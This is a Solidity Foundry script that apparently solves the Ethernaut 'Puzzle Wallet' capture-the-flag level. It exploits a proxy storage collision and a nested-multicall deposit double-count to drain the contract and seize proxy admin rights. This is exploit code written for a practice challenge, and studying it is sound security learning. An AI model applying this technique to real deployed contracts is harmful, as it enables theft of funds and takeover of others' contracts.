// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel24.sol";
import "forge-std/Script.sol";

contract POC is Script {
    PuzzleWallet wallet =
        PuzzleWallet(0xe01E13B18135ed4C749A4891B291280747801ef6);
    PuzzleProxy proxy =
        PuzzleProxy(payable(0xe01E13B18135ed4C749A4891B291280747801ef6));

    function run() external {
        vm.startBroadcast();

        //create encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositSelector
        );

        //make ourselves owner of the wallet
        proxy.proposeNewAdmin(msg.sender);

        //whitelist our address
        wallet.addToWhitelist(msg.sender);

        //call multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);

        //call execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");

        //call setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        //ensure that our exploit worked
        console.log("New admin is: ", proxy.admin());
        vm.stopBroadcast();
    }
}
